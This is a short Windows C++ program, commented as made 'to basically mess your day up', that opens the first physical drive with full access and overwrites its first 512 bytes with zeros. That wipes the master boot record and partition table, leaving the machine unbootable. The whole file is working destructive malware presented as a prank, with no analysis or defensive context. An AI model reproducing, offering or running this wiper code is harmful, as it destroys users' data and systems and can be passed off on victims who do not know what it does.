
/* (c) All Rights Resrved, Dashies Software Inc. */

/* Made to basically mess your day up lol */

#include "stdafx.h"

#include<windows.h>
#include<iostream>
#include<string>

using namespace std;

std::string File = "\\\\.\\PhysicalDrive0";
DWORD Write;
char microsoftbootsectordata[512];

int main(int length, char ** parameter) {
	ZeroMemory(&microsoftbootsectordata, sizeof(microsoftbootsectordata));

	HANDLE DoIt = CreateFileA(File.c_str(), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	WriteFile(DoIt, microsoftbootsectordata, 512, &Write, NULL);
	CloseHandle(DoIt);

	return 0;
}


